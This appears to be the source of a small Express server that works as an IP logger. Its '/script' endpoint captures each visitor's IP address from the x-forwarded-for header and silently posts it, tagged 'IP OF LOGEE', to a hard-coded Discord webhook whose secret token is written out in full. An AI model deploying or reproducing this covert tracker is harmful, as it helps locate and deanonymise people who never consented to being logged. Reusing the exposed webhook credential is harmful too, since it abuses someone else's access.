const express = require('express')
var sha512 = require('js-sha512');
const app = express()
const port = process.env.PORT || 8080;

const { Webhook, MessageBuilder } = require('discord-webhook-node');
const hook = new Webhook("https://discord.com/api/webhooks/873940981760794655/8_PfP4myYYiXpohnCpynjK3_BdfELqqP5ZWNBxUnrarIeLxwqU-Dq0mag_LlnncbQKcM");

app.get('/script', (req, res) => {
  var ip = req.header('x-forwarded-for')
 
  hook.send(`IP OF LOGEE: ${ip}`)

  res.sendStatus(200)
})

app.listen(port, () => {
  console.log(`App listening at http://localhost:${port}`)
})